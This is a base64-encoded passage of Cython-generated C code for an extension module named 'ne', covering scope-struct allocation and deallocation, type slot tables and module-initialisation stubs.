fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJdOwogICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSk7CiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7CiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDsKICB9CiAgI2VuZGlmCiAgcmV0dXJuIG87Cn0KCnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlPYmplY3QgKm8pIHsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgKCFQeVR5cGVfSVNfR0MoUHlfVFlQRShvKSkgfHwgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSkgewogICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikgewogICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47CiAgICB9CiAgfQogICNlbmRpZgogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcn0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYyA9IHsKICAibmUuX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAibmUuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByIiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWV0aG9kc1tdID0gewogIHswLCAwLCAwLCAwfQp9OwoKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2dsb2JhbF9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKCgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlIiwgMCk7CiAgCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICAjZWxzZQogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7CiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKQogICNlbHNlCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByOwogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNlbmRpZgogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyOwogIH0KICAjZW5kaWYKICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgI2Vsc2UKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0gJl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7CiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7CiAgfQogICNlbmRpZgogICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA5LCBfX3B5eF9MMV9lcnJvcikKICAjZWxzZQogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAmX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkgewogICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAtMTsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9weW1vZF9jcmVhdGUoUHlPYmplY3QgKnNwZWMsIFB5TW9kdWxlRGVmICpkZWYpOyAKc3RhdGljIGludCBfX3B5eF9weW1vZF9leGVjX25lKFB5T2JqZWN0KiBtb2R1bGUpOyAKc3RhdGljIFB5TW9kdWxlRGVmX1Nsb3QgX19weXhfbW9kdWxlZGVmX3Nsb3RzW10gPSB7CiAge1B5X21vZF9jcmVhdGUsICh2b2lkKilfX3B5eF9weW1vZF9jcmVhdGV9LAogIHtQeV9tb2RfZXhlYywgKHZvaWQqKV9fcHl4X3B5bW9kX2V4ZWNfbmV9LAogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogIHtQeV9tb2RfZ2lsLCBQeV9NT0RfR0lMX1VTRUR9LAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hF